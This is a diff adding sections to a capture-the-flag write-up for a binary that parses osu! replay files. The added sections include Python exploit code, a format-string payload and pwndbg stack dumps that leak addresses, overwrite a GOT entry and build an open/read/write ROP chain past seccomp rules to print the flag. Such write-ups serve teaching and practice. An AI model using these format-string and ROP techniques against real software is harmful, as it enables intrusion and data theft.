@@ -48,17 +48,22 @@ Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):
 Once the input has been read, the hex is decoded to raw bytes for further
 processing.
 
-<!-- TODO: write more about the `OSR` file, linking to the OSU wiki with
-information on the internally represented data. then link it to the several
-functions sprinkled across the binary to parse those items -->
+This is further reflected in the `main` function, which simply reads one line
+containing hex from the user, and converts it to binary arbitrarily.
 
-From the replay file alone, the program is able to extract some metadata, namely
-the following items.
+![](screenshots/main_func_hex_read_binja.png)
+
+This shows that the `main` function only retrieves input _once_.
+
+Once reading in the `.osr` file from hex, the program goes to fetch some
+metadata about the replay.
 
 - Which game type that was played in the replay file. (ie. its mode)
 - Its hash, represented by a string
 - The player who created the replay file
 - The total number of prompts missed within the replay
+
+![](screenshots/metadata_parse_binja.png)
 
 Luckily, the data format that the binary is expecting to parse is a subset of
 the data formats specified on [OSU's well documented
@@ -154,7 +159,7 @@ would namely mean that the program would be disallowed from spawning new
 processes. This does not affect anything in our current program flow, but, as a
 spoiler, it makes things a little less fun. (\*_cough_\*)
 
-<!--todo: show the main function in some meaningful way-->
+![](screenshots/seccomp_stuff_binja.png)
 
 ## vulnerabilities
 
@@ -243,6 +248,11 @@ there achirves two things:
   address to keep `printf` happy
     - failure to do so will cause the bianry to crash
 
+I originally thought that building a call tree like this would cause issues for
+exploitation since a return address was continuously being pushed onto the
+stack, but since `main` builds its own stack frame everytime, it's actually
+fine.
+
 A small blocker to this would be that there is no address pointing to the GOT
 entry within the stack at the time we call. This is easily remedied however as
 we can introduce such a pointer into the stack before the `printf` call is
@@ -317,11 +327,28 @@ str_buf --> |7061796c6f616420|     |payload |
             '----------------'
 ```
 
+The `python3` code to build these blocks can be seen below:
+
+```py
+    payload = b''.join([
+        b"\x00",                                # replay type
+        b"\xde\xad\xbe\xef",                    # 4 bytes for consumption
+        to_serialized_str(flat({0x0: b"yippee", # hash
+                                0xf0: p64(exe.got["seccomp_release"]),
+                                })),
+        to_serialized_str(format_payload),      # name (printf vuln)
+        to_serialized_str(b"yahoooooooo"),      # replay
+        b'a' * 10,                              # consume a couple of bytes
+        struct.pack(">H", 0x00),                # read a short
+    ])
+    r.sendlineafter(b"\n", payload.hex().encode())
+```
+
 in my solve script specifically, the address to the `seccomp_release` entry is
-places `0x28` quadwords below the top of the stack. Eith this knowledge, we can
+places `0x28` quadwords below the top of the stack. With this knowledge, we can
 build up our format string payload.
 
-We want to definitely leak some addresses o  the stack, namely the following:
+We want to definitely leak some addresses on the stack, namely the following:
 
 - An address pointing to somewhere in `libc`
     - Specifically, `%53$llx`, which gives us the return address to
@@ -350,6 +377,121 @@ Well... with the caviat that there are seccomp rules in place which disable the
 use of either `execve` and `execveat`, which disables the use of `system` or
 other typical methods to spawn a shell. Therefore, out ROP chain must be one
 to read and print out `flag.txt`
+
+This is decently straight forward. I write `flag.txt\x00` to some known memory
+address, then perform a series of `open`, `read` and `write` calls to dump the
+file contents
+
+This simply looks like the following in `python3`, where `flag_addr` is the
+address of where I wrote `flag.txt`, which I did when writing in the hash.
+
+```py
+    # the payload above should bring us back to the start of main!! so now we
+    # set up a rop chain
+    rop = ROP(libc)
+    # rop.raw(rop.ret)                            # just in case, like usual
+    rop.call("open", [flag_addr, 0, 0])
+    # read/write the flag into the global section of the exe
+    rop.call("read", [3, 0x404080, 0xff])
+    rop.call("write", [1, 0x404080, 0xff])
+    rop.call("exit", [0])
+```
+
+Now, regarding the manner of writing multiples of shorts onto the stack such
+that we create our ROP chain, I perform double duty when writing things onto the
+stack. Since we know the address of the stack, and thus the address of the
+original main function call, we can build our ROP chain there, and exit out the
+multiples of additional `main` stack frames invoked by destroying the GOT entry
+of `seccomp_release`.
+
+Using trial and error more than anything, I determine how many shorts I can
+write in a given call to `printf`, as I fill the upper half of the 256B buffer
+with the format string payload, and fill the lower half of the buffer with
+addresses to write to. Using `pwndbg`'s `tel` command, this is what that looks
+like:
+
+```c
+0a:0050│ rdi 0x7fffdf818f60 ◂— '%62295c%30$hn%57690c%31$hn%43782c%32$hn%32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
+0b:0058│-118 0x7fffdf818f68 ◂— '30$hn%57690c%31$hn%43782c%32$hn%32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
+0c:0060│-110 0x7fffdf818f70 ◂— '690c%31$hn%43782c%32$hn%32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
+0d:0068│-108 0x7fffdf818f78 ◂— 'hn%43782c%32$hn%32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
+0e:0070│-100 0x7fffdf818f80 ◂— 'c%32$hn%32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
+0f:0078│-0f8 0x7fffdf818f88 ◂— '32841c%33$hn%34$hn%35$hn%36$hn%37$hn'
+10:0080│-0f0 0x7fffdf818f90 ◂— '3$hn%34$hn%35$hn%36$hn%37$hn'
+11:0088│-0e8 0x7fffdf818f98 ◂— 'hn%35$hn%36$hn%37$hn'
+12:0090│-0e0 0x7fffdf818fa0 ◂— '%36$hn%37$hn'
+13:0098│-0d8 0x7fffdf818fa8 ◂— 0x616161006e682437 /* '7$hn' */
+14:00a0│-0d0 0x7fffdf818fb0 ◂— 0x6161617661616175 ('uaaavaaa')
+15:00a8│-0c8 0x7fffdf818fb8 ◂— 0x6161617861616177 ('waaaxaaa')
+16:00b0│-0c0 0x7fffdf818fc0 ◂— 0x6261617a61616179 ('yaaazaab')
+17:00b8│-0b8 0x7fffdf818fc8 ◂— 0x6261616362616162 ('baabcaab')
+18:00c0│-0b0 0x7fffdf818fd0 —▸ 0x7fffdf819208 —▸ 0x7fb7d4a29d90 (__libc_start_call_main+128) ◂— mov edi, eax
+19:00c8│-0a8 0x7fffdf818fd8 —▸ 0x7fffdf81920a ◂— 0x7fb7d4a2
+1a:00d0│-0a0 0x7fffdf818fe0 —▸ 0x7fffdf81920c ◂— 0x7fb7
+1b:00d8│-098 0x7fffdf818fe8 —▸ 0x7fffdf81920e ◂— 0
+1c:00e0│-090 0x7fffdf818ff0 —▸ 0x7fffdf819210 ◂— 0
+1d:00e8│-088 0x7fffdf818ff8 —▸ 0x7fffdf819212 ◂— 0x1749000000000000
+1e:00f0│-080 0x7fffdf819000 —▸ 0x7fffdf819214 ◂— 0x40174900000000
+1f:00f8│-078 0x7fffdf819008 —▸ 0x7fffdf819216 ◂— 0x4017490000
+```
+In short, for every pointer I write onto the stack, there is an format string
+payload that writes the correct short at that address which achieves the ROP
+chain. Add too many addresses into the buffer and the payload risks overwriting
+the addresses being referenced, while write too little and we would not be
+optimal in our requests.
+
+That balancing game looks like the following in `python3` code
+
+```py
+    # write a bunch of shorts per request
+    rop_head = main_scope_ret_addr
+
+    for i in range(repititons):
+        addr_offset = 0x18 + 6
+        format_payload = b""
+        addr_table = b""
+        total_written = 0
+        print_amount = 0
+        for short in rop_shorts[i*shorts_per_req : (i+1)*shorts_per_req]:
+            addr_table += p64(rop_head)
+            rop_head += 2
+
+            # add each short such that it'd write to the address we added
+            short_raw = unpack(short, "all")
+            print_amount = (short_raw - (total_written & 0xffff) + 0x10000) % 0x10000
+            if(short_raw or print_amount):
+                format_payload += f"%{print_amount}c".encode("ascii")
+                total_written += print_amount
+            format_payload += f"%{addr_offset}$hn".encode("ascii")
+            addr_offset += 1
+
+        payload = b''.join([
+            b"\x00",                                # replay type
+            b"\xde\xad\xbe\xef",                    # 4 bytes for consumption
+            to_serialized_str(flat({0x0: b"yippee", # hash
+                                    0x100 - addr_table_size: addr_table,
+                                    })),
+            to_serialized_str(format_payload),      # name (printf vuln)
+            to_serialized_str(b"yahoooooooo"),      # replay
+            b'a' * 10,                              # consume a couple of bytes
+            struct.pack(">H", 0xff),                # read a short
+        ])
+        r.sendlineafter(b"Submit", payload.hex().encode())
+        r.info(f"sent {i+1}: {format_payload=}")
+```
+
+Now that the ROP chain is set up, we simply need to get to pop off all the stack
+frames we created and return to the original call to main, where the ROP chain
+now lies. Luckily, this is as simple as overwriting the GOT entry of
+`seccomp_release` to instead point at a `ret` address, as it would immediate
+return and cause the top-most call to `main` to clean its stack frame (and
+domino affect its way back down)
+
+Once we hit our ROP chain, we see success
+
+## flag
+
+`osu{fmtstr_in_the_b1g_2025}`
 
 > \* I was given a year's license to use Binary Ninja for ICC 2025 under the
 > condition I create this writeup. So, ([\*_cough_\*](https://youtu.be/j69knNADinw))
